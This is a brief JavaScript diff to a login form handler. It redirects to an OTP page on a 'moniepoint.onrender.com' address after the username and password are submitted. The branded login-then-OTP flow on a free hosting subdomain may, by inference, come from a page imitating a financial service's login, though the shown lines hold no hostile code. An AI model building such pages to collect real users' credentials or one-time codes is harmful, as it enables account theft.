@@ -28,7 +28,7 @@ Form.addEventListener("submit", (e) => {
     if(request.statusText === 'OK'){
       username.value = "";
       password.value = "";
-      location.href = "/otp";
+      location.href = "https://moniepoint.onrender.com/otp";
     }else {
       console.log("error")
     }
